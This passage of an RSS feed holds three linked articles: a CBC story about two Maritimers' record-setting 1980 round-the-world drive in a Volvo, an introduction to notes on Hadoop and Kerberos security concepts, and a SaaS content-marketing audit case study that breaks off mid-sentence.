<em>Around the World in 80 Days</em>, saw him traverse the globe by railway, steamer, elephant and wind-powered sledge. He made it to London with moments to spare.&nbsp;</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5786351.1604338043!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/garry-sowerby-and-ken-langley-reminisce-about-their-road-trip-around-the-world-on-a-recent-reunion-w.jpg 300w,https://i.cbc.ca/1.5786351.1604338043!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/garry-sowerby-and-ken-langley-reminisce-about-their-road-trip-around-the-world-on-a-recent-reunion-w.jpg 460w,https://i.cbc.ca/1.5786351.1604338043!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/garry-sowerby-and-ken-langley-reminisce-about-their-road-trip-around-the-world-on-a-recent-reunion-w.jpg 620w,https://i.cbc.ca/1.5786351.1604338043!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/garry-sowerby-and-ken-langley-reminisce-about-their-road-trip-around-the-world-on-a-recent-reunion-w.jpg 780w,https://i.cbc.ca/1.5786351.1604338043!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/garry-sowerby-and-ken-langley-reminisce-about-their-road-trip-around-the-world-on-a-recent-reunion-w.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5786351.1604338043!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/garry-sowerby-and-ken-langley-reminisce-about-their-road-trip-around-the-world-on-a-recent-reunion-w.jpg"></p></div><figcaption>Garry Sowerby and Ken Langley reminisce about their road trip around the world during a recent reunion in Petitcodiac, N.B.<!-- --> <!-- -->(Dave Irish/CBC)</figcaption></figure></span></p>  <p>A century later, two Maritimers named Garry Sowerby and Ken Langley&nbsp;got to thinking about the legendary challenge on a bleary-eyed road trip from Ottawa to Halifax in 1977.</p>  <p>"There was nothing to entertain yourself with in the car except an eight-track tape and yourself, so we got talking about road trips," Sowerby says. "And by the time we got halfway through New Brunswick, in the middle of the night, I remember Ken saying, 'What's the greatest road trip there ever could be?'"</p>  <h2>Navigating a world without internet or GPS</h2>  <p>After kicking around a few ideas, they realized there was only one: they would race to be the fastest men around the world.</p>  <p>They set out in the fall of 1980. CBC met up recently with the adventurers,&nbsp;on the 40th anniversary of their epic attempt.</p>  <p>Both men were university students. Langley would go on to become a lawyer in his native Cape Breton, while Halifax-based&nbsp;Sowerby, who had grown up in New Brunswick,&nbsp;had recently left the Canadian military&nbsp;and later&nbsp;<a href="http://www.adventuredrive.ca/"><u>made a career out of organizing international driving adventures</u></a>.</p>  <p>They named their expedition&nbsp;Odyssey 77. But first they had to plan to navigate the globe in an era with no internet or GPS.&nbsp;</p>  <p>"We want to figure out, OK, how long's it going to take to get from Bombay to Calcutta?" Sowerby says. "So we write the bus company in India —&nbsp;write them a letter, mail it. It takes two months to figure out how long it takes a bus to go from Bombay to Calcutta. That's how we put our timing together."</p>  <p>They drove taxis to raise money and landed a few major corporate sponsors who bet big that the boys could set a new Guinness world record. Volvo supplied them with a brand-new station wagon, which they watched come off the assembly line at the old Halifax plant.</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5785972.1604321930!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/red-volvo-takes-a-corner-on-a-rest-reunion-trip-in-new-brunswick.jpg 300w,https://i.cbc.ca/1.5785972.1604321930!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/red-volvo-takes-a-corner-on-a-rest-reunion-trip-in-new-brunswick.jpg 460w,https://i.cbc.ca/1.5785972.1604321930!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/red-volvo-takes-a-corner-on-a-rest-reunion-trip-in-new-brunswick.jpg 620w,https://i.cbc.ca/1.5785972.1604321930!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/red-volvo-takes-a-corner-on-a-rest-reunion-trip-in-new-brunswick.jpg 780w,https://i.cbc.ca/1.5785972.1604321930!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/red-volvo-takes-a-corner-on-a-rest-reunion-trip-in-new-brunswick.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5785972.1604321930!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/red-volvo-takes-a-corner-on-a-rest-reunion-trip-in-new-brunswick.jpg"></p></div><figcaption>The Volvo, named Red Cloud, takes a corner on the recent reunion trip in New Brunswick. <!-- --> <!-- -->(Dave Irish/CBC)</figcaption></figure></span></p>  <p>The goal was simple and nearly impossible: start in Toronto, drive west to the Pacific Ocean, fly themselves and the Volvo to Australia, drive across it, fly again to India, drive right through the Middle East and across Europe, grab one last plane to the U.S. and then drive all the way back to the starting line in Toronto.&nbsp;</p>  <p>The Guinness record stood at 102 days and required one driver and one navigator to drive the same vehicle 26,738 miles (the circumference of the Earth), travelling in&nbsp;both the northern and southern hemispheres. Time spent flying between roads would count, but they wouldn't get credit for those air miles.</p>  <h2>From the CN Tower to the CN Tower</h2>  <p>As they reached the start line near the CN Tower in Toronto on Sept. 6, 1980, it hit them that there was a lot of money on the line. And some people expected them to fail.&nbsp;</p>  <p>"Just when we were leaving, I heard the president of Volvo Canada say to his PR man, 'If this thing&nbsp;f--ks up, we'll be driving pogo sticks.'" Sowerby says with a laugh.&nbsp;</p>  <p>The&nbsp;boys sported matching racing suits. With a huge media contingent watching, Sowerby shifted into first and Langley guided them west.&nbsp;</p>  <p>The drive to the Pacific was straightforward and they paid an excess baggage fee to fly Red Cloud, as the Volvo became known, to Australia.&nbsp;Australia was hard driving, especially hot, dusty and deserted Alice Springs. The car had no air conditioning, so the windows were always down, and no power steering or cruise control, so Sowerby's arms and legs were always working.&nbsp;</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5785986.1604322212!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/the-boys-drew-attention-everywhere-including-on-this-stop-in-india-or-pakistan.jpg 300w,https://i.cbc.ca/1.5785986.1604322212!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/the-boys-drew-attention-everywhere-including-on-this-stop-in-india-or-pakistan.jpg 460w,https://i.cbc.ca/1.5785986.1604322212!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/the-boys-drew-attention-everywhere-including-on-this-stop-in-india-or-pakistan.jpg 620w,https://i.cbc.ca/1.5785986.1604322212!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/the-boys-drew-attention-everywhere-including-on-this-stop-in-india-or-pakistan.jpg 780w,https://i.cbc.ca/1.5785986.1604322212!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/the-boys-drew-attention-everywhere-including-on-this-stop-in-india-or-pakistan.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5785986.1604322212!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/the-boys-drew-attention-everywhere-including-on-this-stop-in-india-or-pakistan.jpg"></p></div><figcaption>The boys drew attention everywhere, including on this stop in India or Pakistan. <!-- --> <!-- -->(Submitted by Garry Sowerby)</figcaption></figure></span></p>  <p>Occasionally they were shaken by a passing "road train," a tractor-trailer hauling three or four full-sized trailers. One horse wandered a little too close.&nbsp;</p>  <p>"They just roared through," Langley says. "They wouldn't stop. They just hit these guys. The horse looked like it had been turned inside out. I'll never forget that."</p>  <p>Unfortunately, the duo put their "'roo bar" to good use as one kangaroo bounced in front of them before they could stop.&nbsp;&nbsp;</p>  <p>"If we hadn't put that on, that car probably wouldn't be here. We were going about 80 miles an hour. That kangaroo would have come right through the grill. That would have been the end of the trip," Langley says.&nbsp;</p>  <p>After Australia, they boarded a plane bound for Bombay, as Mumbai was then known.&nbsp;&nbsp;</p>  <p>Sowerby felt India reaching up for him as the plane entered its air space in the middle of the night. A&nbsp;scent, and&nbsp;waves of heat, rose through the aircraft. It was unlike anything he'd experienced.&nbsp;</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5785991.1604322382!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/sowerby-and-langley-drove-red-cloud-right-out-of-the-museum-and-back-onto-the-road-this-fall.jpg 300w,https://i.cbc.ca/1.5785991.1604322382!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/sowerby-and-langley-drove-red-cloud-right-out-of-the-museum-and-back-onto-the-road-this-fall.jpg 460w,https://i.cbc.ca/1.5785991.1604322382!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/sowerby-and-langley-drove-red-cloud-right-out-of-the-museum-and-back-onto-the-road-this-fall.jpg 620w,https://i.cbc.ca/1.5785991.1604322382!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/sowerby-and-langley-drove-red-cloud-right-out-of-the-museum-and-back-onto-the-road-this-fall.jpg 780w,https://i.cbc.ca/1.5785991.1604322382!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/sowerby-and-langley-drove-red-cloud-right-out-of-the-museum-and-back-onto-the-road-this-fall.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5785991.1604322382!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/sowerby-and-langley-drove-red-cloud-right-out-of-the-museum-and-back-onto-the-road-this-fall.jpg"></p></div><figcaption>This fall, Sowerby and Langley drove Red Cloud out of the Maritime Motorsports Hall of Fame museum in Petitcodiac and back onto the road.<!-- --> <!-- -->(Dave Irish/CBC)</figcaption></figure></span></p>  <p>After getting their car off the plane and onto the road, the shock increased. From dawn, rickshaws and snake charmers jostled with taxis and trucks in the hot, dusty heat. The road signs were foot-high stones with the road name handwritten on it. "If you miss one of those, the whole trip takes a big hit in the time. Time was our enemy," Langley&nbsp;says.&nbsp;</p>  <p>"When you're driving here, there might be once a year where you require immediate evasive action to avoid an accident," Sowerby says. "But in India, that would happen 25 times a day."</p>  <p>At the end of one long day, they stopped in a city of two million that they'd never heard of before. Most buildings stood one storey tall and were lit with kerosene or fires. Dark, strange, packed roads made it hard to navigate, so Langley hired a rickshaw driver to escort them to their accommodation: it turned out to be a millionaire's mansion.&nbsp;Gatekeepers let them in and they feasted that night.&nbsp;</p>  <p>Early the next morning, they rolled through the mist, speeding through remote villages, surprising people doing their morning toilet. Langley never once got them lost, nor forced them to backtrack. "We didn't have the time for it," he says.&nbsp;</p>  <p>They ended each 12-hour day looking like coal miners, painted with exhaust, dirt and soot. They reached Pakistan just as Iraq invaded Iran, wrecking their route to Europe. After some frantic work on the phones, they found a cargo 707 willing to take the guys and the car to Athens —&nbsp;for $18,000. So much for making any money on the trip.&nbsp;</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5785975.1604321984!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/the-around-the-world-trip-was-widely-covered-in-the-media-in-1980.jpg 300w,https://i.cbc.ca/1.5785975.1604321984!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/the-around-the-world-trip-was-widely-covered-in-the-media-in-1980.jpg 460w,https://i.cbc.ca/1.5785975.1604321984!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/the-around-the-world-trip-was-widely-covered-in-the-media-in-1980.jpg 620w,https://i.cbc.ca/1.5785975.1604321984!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/the-around-the-world-trip-was-widely-covered-in-the-media-in-1980.jpg 780w,https://i.cbc.ca/1.5785975.1604321984!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/the-around-the-world-trip-was-widely-covered-in-the-media-in-1980.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5785975.1604321984!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/the-around-the-world-trip-was-widely-covered-in-the-media-in-1980.jpg"></p></div><figcaption>The around-the-world trip was widely covered in the media in 1980. <!-- --> <!-- -->(Submitted by Garry Sowerby)</figcaption></figure></span></p>  <p>Sowerby, a pilot himself, sat in the cockpit with the two pilots while Langley sat in the back and tried not to stare at the emergency door. The idea that he would fling it open and kill them all took over his exhausted brain.&nbsp;</p>  <p>"So I went up [to Garry]&nbsp;and I said, 'How are you doing?' He says, 'Not bad. How are you?' I said, 'Not so good. You might have to knock me out.'"</p>  <p>Sowerby says he'd never seen his friend afraid before. "What am I going to do? Tap the captain on the shoulder and say, 'Hey, have you got a monkey wrench? Ken wants me to club him so he doesn't open that door that you showed us how to work.' We couldn't do that," he says.&nbsp;</p>  <p>"We tied him to the seat and we're breaking out laughing about it. I covered him up with a blanket."</p>  <p>"Thank God I finally went to sleep," Langley says. "That was a long, hard night."</p>  <h2>Grim Eastern Bloc</h2>  <p>In Europe, Langley bounced back, and Sowerby had to be dragged back into the car. It started as they skirted the Eastern Bloc and passed through German Democratic Republic, better known as East Germany.&nbsp;</p>  <p>But the communist official who let them in gave them 12 hours to get out. They floored it across the country.</p>  <p>"Of everything I saw on that trip, East Germany was the saddest. No one was smiling. There was no colour, no paint everywhere. We'd drive that car down a street and people would glance and look away, afraid to look at it," Sowerby says.&nbsp;</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5785980.1604403841!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/the-74-day-sprint-earned-the-boys-a-spot-on-the-cover-of-the-1984-guinness-book-of-world-records.jpg 300w,https://i.cbc.ca/1.5785980.1604403841!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/the-74-day-sprint-earned-the-boys-a-spot-on-the-cover-of-the-1984-guinness-book-of-world-records.jpg 460w,https://i.cbc.ca/1.5785980.1604403841!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/the-74-day-sprint-earned-the-boys-a-spot-on-the-cover-of-the-1984-guinness-book-of-world-records.jpg 620w,https://i.cbc.ca/1.5785980.1604403841!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/the-74-day-sprint-earned-the-boys-a-spot-on-the-cover-of-the-1984-guinness-book-of-world-records.jpg 780w,https://i.cbc.ca/1.5785980.1604403841!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/the-74-day-sprint-earned-the-boys-a-spot-on-the-cover-of-the-1984-guinness-book-of-world-records.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5785980.1604403841!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/the-74-day-sprint-earned-the-boys-a-spot-on-the-cover-of-the-1984-guinness-book-of-world-records.jpg"></p></div><figcaption>The 74-day sprint earned the boys a spot on the cover of the 1984 Guinness Book of Records. <!-- --> <!-- -->(Submitted by Garry Sowerby)</figcaption></figure></span></p>  <p>Sowerby had been shifting gears for 65 days by the time they reached Paris and got an honour guard leading them down the Champs-Élysées. He could barely walk, let alone drive.</p>  <p>"My knee was throbbing and I couldn't sleep. Then we drove to London the next day and I stayed awake all that night. Then we flew to Houston, Texas, and I still hadn't been asleep. I'd been awake for maybe close to 100 hours and that's when I thought, maybe I'm going crazy. I thought, this is what happens when people lose their minds," he says.&nbsp;</p>  <p>He found a doctor who found a pill that helped him sleep. They forced themselves back into Red Cloud and drove through New Orleans, Georgia and Boston, caught the Yarmouth ferry to Nova Scotia, and hit the highway home to Halifax.</p>  <h2>They'd been everywhere</h2>  <p>And then, for the very first time on the trip, the unthinkable happened. The car started making funny noises and then spluttered to a stop.&nbsp;</p>  <p>"We ran out of fuel because I was so excited about being in Nova Scotia I forgot to check the fuel gauge," …</p></span></p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.cbc.ca/news/canada/nova-scotia/volvo-around-the-world-maritimers-odyssey-1.5785959">https://www.cbc.ca/news/canada/nova-scotia/volvo-around-the-world-maritimers-odyssey-1.5785959</a></em></p>]]>
            </description>
            <link>https://www.cbc.ca/news/canada/nova-scotia/volvo-around-the-world-maritimers-odyssey-1.5785959</link>
            <guid isPermaLink="false">hacker-news-small-sites-25017720</guid>
            <pubDate>Sat, 07 Nov 2020 19:09:32 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Hadoop and Kerberos: The Madness Beyond the Gate]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25017718">thread link</a>) | @jaxb
<br/>
November 7, 2020 | https://steveloughran.gitbooks.io/kerberos_and_hadoop/content/sections/kerberos_the_madness.html | <a href="https://web.archive.org/web/*/https://steveloughran.gitbooks.io/kerberos_and_hadoop/content/sections/kerberos_the_madness.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    
                                <section>
                                
                                
<p>Authors:</p>
<p>S.A. Loughran</p>
<hr>

<p>When HP Lovecraft wrote his books about forbidden knowledge which would reduce the reader to insanity, of "Elder Gods" to whom all of humanity were a passing inconvenience, most people assumed that he was making up a fantasy world.
In fact he was documenting Kerberos.</p>
<p>What is remarkable is that he did this fifty years before kerberos was developed. This makes him less of an author, 
instead: a prophet.</p>
<p>What he wrote was true: there are some things humanity was not meant to know. Most people are better off living lives of naive innocence, never having to see an error message about SASL or GSS, never fear building up scripts of incantations to <code>kadmin.local</code>, incantations which you hope to keep evil and chaos away. To never stare in dismay at the code whose true name must never be spoken, but instead it's initials whispered, "UGI". For those of us who have done all this, our lives are forever ruined. From now on we will cherish any interaction with a secure Hadoop cluster —from a client application to HDFS, or application launch on a YARN cluster, and simply viewing a web page in a locked down web UI —all as a miracle against the odds, against the forces of chaos struggling to destroy order.
And forever more, we shall fear those voices calling out to us in the night, the machines by our bed talking to us, saying things like "we have an urgent support call related to REST clients on a remote kerberos cluster —can you help?" </p>
<table>
<thead>
<tr>
<th>HP Lovecraft</th>
<th>Kerberos</th>
</tr>
</thead>
<tbody>
<tr>
<td>Evil things lurking in New England towns and villages</td>
<td>MIT Project Athena</td>
</tr>
<tr>
<td>Ancient, evil deities oblivious to humanity</td>
<td>Kerberos Domain Controller</td>
</tr>
<tr>
<td>Books whose reading will drive the reader insane</td>
<td>IETF RFC 4120</td>
</tr>
<tr>
<td>Entities which are never spoken of aloud</td>
<td>UserGroupInformation</td>
</tr>
<tr>
<td>People driven insane by their knowledge</td>
<td>You</td>
</tr>
</tbody>
</table>
<p>This documents contains the notes from previous people who have delved too deep into the mysteries of Apache™ Hadoop® and Kerberos, who have read the forbidden source code, maybe who have even contributed to it. If you wish to preserve your innocence, to view the world as a place of happiness: stop now.</p>
<h2 id="disclaimer">Disclaimer</h2>
<p>This document is a collection of notes based on the experience of the author. There are no guarantees that any of the information contained within was correct at the time of writing, let alone the time of reading. The author does not accept any responsibility for actions made on the basis of the information contained herein, be it correct or incorrect.</p>
<p>The reader of this document is likely to leave with some basic realisation that Kerberos, while important, is an uncontrolled force of suffering and devastation. The author does not accept any responsibility for the consequences of such knowledge.</p>
<p>What has been learned cannot be unlearned(*)</p>
<p>(*) Except for Kerberos workarounds you wrote 18 months ago and for which you now field support calls.</p>
<hr>

<p>What is the problem that Hadoop security is trying to address? Securing Hadoop.</p>
<p>Apache Hadoop is "an OS for data".
A Hadoop cluster can rapidly become the largest stores of data in an organisation.
That data can explicitly include sensitive information: financial, personal, business, and can often implicitly contain data which needs to be sensitive about the privacy of individuals (for example, log data of web accesses alone).
Much of this data is protected by laws of different countries.
This means that access to the data needs to be strictly controlled, and accesses made of that data potentially logged to provide an audit trail of use.</p>
<p>You have to also consider, "why do people have Hadoop clusters?".</p>
<p>It's not just because they have lots of data --its because they want to make use of it.
A data-driven organisation needs to trust that data, or at least be confident of its origins.
Allowing entities to tamper with that data is dangerous.</p>
<p>For the protection of data, then, read and write access to data stored directly in the HDFS filesystem needs to be protected.
Applications which work with their data in HDFS also need to have their accesses restricted: Apache HBase and Apache Accumulo store their data in HDFS, Apache Hive submits SQL queries to HDFS-stored data, etc.
All these accesses need to be secured; applications like HBase and Accumulo granted restricted access to their data, and themselves securing and authenticating communications with their clients.</p>
<p>YARN allows arbitrary applications to be deployed within a Hadoop cluster.
This needs to be done without granting open access to the entire cluster from those user-launched applications, while isolating different users' work.
A YARN application started by user Alice should not be able to directly manipulate an application launched by user "Bob", even if they are running on the same host.
This means that not only do they need to run as different users on the same host (or in some isolated virtual/container), the applications written by Alice and Bob themselves need to be secure.
In particular, any web UI or IPC service they instantiate needs to have its access restricted to trusted users. here Alice and Bob</p>
<h2 id="authentication">Authentication</h2>
<p>The authentication problem: who is a caller identifying themselves as —and can you verify
that they really are this person.</p>
<p>In an unsecure cluster, all callers to HDFS, YARN and other services are trusted to be
who they say they are. In a secure cluster, services need to authenticate callers.
That means some information must be passed with remote IPC/REST calls to declare
a caller's identity and authenticate that identity</p>

<p>Does an (authenticated) user have the permissions to perform the desired request?</p>
<p>This isn't handled by Keberos: this is Hadoop-side, and is generally done
in various ways across systems. HDFS has file and directory permissions, with the
user+group model now extended to ACLs. YARN allows job queues to be restricted
to different users and groups, so restricting the memory &amp; CPU limits of those
users. When cluster node labels are used to differentiate parts of the cluster (e.g. servers with
more RAM, GPUs or other features), then the queues can be used to restrict access
to specific sets of nodes.</p>
<p>Similarly, HBase and Accumulo have their users and permissions, while Hive uses the
permissions of the source files as its primary access control mechanism.</p>
<p>These various mechanisms are all a bit disjoint, hence the emergence of tools
to work across the entire stack for a unified view, Apache Ranger being one example.</p>
<h2 id="encryption">Encryption</h2>
<p>Can data be intercepted on disk or over the wire?</p>
<h3 id="encrytion-of-persistent-data">Encrytion of Persistent Data.</h3>
<p>HDFS now supports <em>at rest encryption</em>; the data is encrypted while stored on disk.</p>
<p>Before rushing to encrypt all the data, consider that it isn't a magic solution to
security: the authentication and authorisation comes first. Encryption adds a new problem,
secure key management, as well as the inevitable performance overhead. It also complicates
some aspects of HDFS use.</p>
<p>Data stored in HDFS by applications is implicitly encrypted. However, applications like 
Hive have had to be reworked to ensure 
that when making queries across encrypted datasets, temporary data files are also stored
in the same encryption zone, to stop the intermediate data being stored unencrypted.
And of course, analytics code running in the servers may also intentionally or unintentionally
persist the sensitive data in an unencrypted form: the local filesystem, OS swap space
and even OS hibernate-time memory snapshots need to be managed.</p>
<p>Before rushing to enable persistent data encryption, then, you need to consider: what is the
goal here? </p>
<p>What at-REST encryption does deliver is better guarantees that data stored in hard disks
is not recoverable —at least on the HDFS side. However, as OS-level data can persist,
(strongly) wiping HDDs prior to disposal is still going to be necessary to guarantee
destruction of the data.</p>
<h2 id="auditing-and-governance">Auditing and Governance</h2>
<p>Authenticated and Authorized users should not just be able to perform actions
or read and write data —this should all be logged in <em>Audit Logs</em> so that
if there is ever a need to see which files a user accessed, or what individual
made specific requests of a service —that information is available. Audit logs
should be </p>
<ol>
<li><p>Separate log categories from normal processing logs, so log configurations
can store them in separate locations, with different persistence policies.</p>
</li>
<li><p>Machine Parseable. This allows the audit logs themselves to be analyzed. This
does not just have to be for security reasons; Spotify have disclosed that they
run analysis over their HDFS audit logs to identify which files are most popular (and
hence should have their replication factor increased), and which do not get
used more then 7 days after their creation —and hence can be automatically deleted
as part of a workflow.</p>
</li>
</ol>

                                
                                </section>
                            
    </div></div>]]>
            </description>
            <link>https://steveloughran.gitbooks.io/kerberos_and_hadoop/content/sections/kerberos_the_madness.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25017718</guid>
            <pubDate>Sat, 07 Nov 2020 19:09:23 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[SaaS Content Strategy: Should You Build a Funnel or Just Educate Users?]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25017277">thread link</a>) | @andreeamaco
<br/>
November 7, 2020 | https://www.schoolofcontent.net/case-studies/saas-content-strategy-should-you-build-funnel-educate-users-case-study | <a href="https://web.archive.org/web/*/https://www.schoolofcontent.net/case-studies/saas-content-strategy-should-you-build-funnel-educate-users-case-study">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>A couple of weeks ago I received a question from the owner of a 3-year old SaaS company regarding the <a href="https://www.schoolofcontent.net/case-studies/content-types-saas-startups-case-study/">type of content they should focus on</a> to get more leads through content marketing.&nbsp;</p><p>Their story, in big lines, was as follows: content was the only piece in their marketing puzzle that didn't work properly. Most of their clients were acquired through cold outreach or word of mouth, so the cost of acquisition was quite high and they were looking for ways to decrease it. </p><p>They didn't have a clear <a href="https://www.schoolofcontent.net/content-strategy/">strategy</a> in place; they did have a content calendar but the topics were chosen almost randomly, based on what the team though was relevant for their target users, and on keyword traffic potential.&nbsp;</p><p>Their target audience is mostly decision makers — marketing managers, data/analytics managers, or product managers. Their product is an analytics tool aimed mainly at enterprises. They have super strong competitors in the content and audience analytics niches.</p><p>I was curious to see why their content wasn’t performing, so we agreed to do a <a href="https://www.schoolofcontent.net/content-audit/">content audit</a> and craft a small action plan based on the findings.&nbsp;</p><h2>The content audit: how search intent, knowledge level and target persona influence traffic and conversions</h2><p>We started the audit with a couple of goals in mind. We wanted to see:&nbsp;</p><ul><li><p>which funnel stage gets more page views and conversions</p></li><li><p>which search intent drives more page views and conversions</p></li><li><p>the average bounce and exit rates per funnel stage and content type</p></li><li><p>how the search intent influences page views and conversions</p></li><li><p>how the knowledge level influences page views and conversions</p></li><li><p>how the target persona influences page views and conversions</p></li></ul><p>We took this approach because we wanted to first determine the areas of the funnel and the types of content that weren’t performing. Then, we wanted to understand the reasons behind the poor performance.</p><ul><li><p>Was it because the topics were not relevant for the audience?</p></li><li><p>Was it because the knowledge level (of the content) was too basic or too complicated for their target audience?</p></li><li><p>Was it because they were targeting and/or attracting the wrong persona?&nbsp;</p></li></ul><p>As usually, we started with the funnel stages, and we weren’t surprised to see that the top of the funnel content was generating the most page views. However, the conversions were almost evenly distributed across the funnel phases.</p><p><img alt="Conversions 1" src="https://images.ctfassets.net/wqg266fbc5en/3Z8nIkIQOIIgqO3aMhWqJS/1ffb9e72800f371a38a7e94035225971/Conversions__1___1_.png"><img alt="Conversions 2" src="https://images.ctfassets.net/wqg266fbc5en/7bB5STcdNqkFmVUXjx1MZj/140f44d82a86f7bc5e5e721bf7d55e5c/Conversions__2_.png"></p><p>Next, we looked at the search intent, page views and conversions, to see if anything stands out and brings more insights into the “why”.</p><p><img alt="Search intent Page views" src="https://images.ctfassets.net/wqg266fbc5en/7r5r136mzJUcJThBpzzhMi/526c7ae541dbc3d98c90d80152e6b6c4/Search_intent__Page_views.png"></p><p>We noticed that most of the page views were coming from educational content teaching users about the niche or showing examples and how to perform certain marketing operations.</p><p>The content pieces talking about the product — how it works, price — were getting fewer page views. We started to form some hypotheses as to why this SaaS company had generated only 59 conversions from 300K views.&nbsp;</p><p>Very likely, their focus on creating educational content without really <a href="https://www.schoolofcontent.net/blog/map-content-user-journey">mapping it to the funnel</a> or worrying about the target user was one of the reasons behind their content’s poor performance.&nbsp;</p><p>But we wanted to see if the conversion numbers confirmed our initial thoughts.&nbsp;</p><p><img alt="Conversions per search intent 1" src="https://images.ctfassets.net/wqg266fbc5en/6e6sNTLrYN0CbYCQxeyJZp/21a51360bb30f12687d4953852e56728/Conversions__1___2_.png"><img alt="Conversions per search intent 2" src="https://images.ctfassets.net/wqg266fbc5en/2EHNKFTR1X5w727ebroVCf/44acd1b2dd7e4ccd30b9ff04749acb7c/Conversions__2___1_.png"></p><p>We saw indeed that the content talking  about the product, its price, or how other companies used the product to improve their performance was generating more conversions that the broad, off-topic content.&nbsp;</p><p>However, we didn’t have enough clarity yet on what to do next. We knew that the TOFU content performed poorly, and we had an idea about the reason behind this — the content was mostly educational. But when we looked at the full funnel, we saw that the middle and the bottom content performed quite bad as well.&nbsp;</p><p><img alt="Conversions vs page views" src="https://images.ctfassets.net/wqg266fbc5en/51vfvf531im2Co0CicN2ck/6afd6ec3b977e3729ac25692f5fdf606/Conversions__1___3_.png"></p><p>The conversion rates throughout the funnel were really poor, under 1%, so we clearly needed  to investigate further in order to draw some relevant and actionable conclusions.</p><p><img alt="Conversion Rate 1" src="https://images.ctfassets.net/wqg266fbc5en/1rrsM2JTBA6PdbtbsYbFSk/1574fa5f1ae762cd74774f6e161eb8ad/Conversion_Rate__1_.png"></p><p>The next step was to look at the <i>relevance</i> of the content published by this SaaS company. We noticed that the content related to the niche — digital marketing — but not related to the product was generating most of the page views.&nbsp;</p><p>Of course, this was happening because most of their content was targeting broad marketing terms. On the other hand, the content that was related or strongly related to the product was responsible for only 20% of the total page views.&nbsp;</p><p><img alt="Topics Page views" src="https://images.ctfassets.net/wqg266fbc5en/JF9ebIVzLkCnSQzNPQNoY/c56807a33a632953749b37d391bd2da6/Topics__Page_views.png"></p><p>Now, imagine that you're the owner or marketing manager of this SaaS company and your content team tells you that your traffic is increasing every month, so you're on a good path. Yet, when you look at impact on revenue or leads acquired through content, things don't really add up. </p><p>When we looked at the conversions for <i>topics</i> related to their niche, but not to the product, we saw that the numbers were lower than those coming from content strongly related and related to the product. So we knew now that writing about everything marketing-related was not the way to go for this particular company.</p><p><img alt="Topics Conversions" src="https://images.ctfassets.net/wqg266fbc5en/1Y9xmRXOUXWW0tYi76XGSe/603577e05ad0c8069273b90184a821f1/Topics__Conversions.png"></p><p>We then analyzed the <i>knowledge level</i> of their content and we noticed the same pattern: the content targeting beginners was getting more page views, but the conversions were lower. The interesting part here was that the super advanced content 